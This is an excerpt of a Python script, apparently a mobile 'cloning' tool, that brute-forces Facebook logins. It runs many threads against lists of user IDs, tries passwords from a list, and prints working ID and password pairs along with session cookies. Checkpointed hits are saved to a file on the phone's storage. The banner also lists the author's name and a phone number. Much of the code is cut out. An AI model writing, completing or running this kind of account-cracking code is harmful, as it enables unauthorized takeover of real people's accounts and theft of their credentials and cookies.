...
def o():
    ...
    if Mahin == '1':
        i()
    if Mahin == '2':
        os.system('xdg-open https://github.com/shifatbondokshi ')
    if Mahin == '3':
        os.system('xdg-open https://github.com/shifatbondokshi ')
    if Mahin == 'E':
        os.system('exit')
...
\033[1;32m  ╔═══════════════════════════════════════════════════╗
\033[1;97m  ╠══[Author:=======================> \33[1;38SH1F4T BONDOKSH1  \33[1;38m   ║
\033[1;32m  ╠══[Facebook:=====================> SHIFAT BONDOKSHI      ║ 
\033[1;97m  ╠══[Whatsapp:=====================> 01927755908     ║
...
def i():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print('     \033[97;1m[\033[92;1m+\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;46mShifat-XD-OK.txt')
        print('     \033[97;1m[\033[92;1m+\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;196mShifat-XD-CP.txt')
        print("     \033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m-\033[1;32m-\033[1;33m-\033[38;5;196m-")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[38;5;46m[SH1F4T-OK] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;46m[SH1F4T-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/SH1F4T-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r    \33[1;93m[\033[1;95mSH1F4T\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
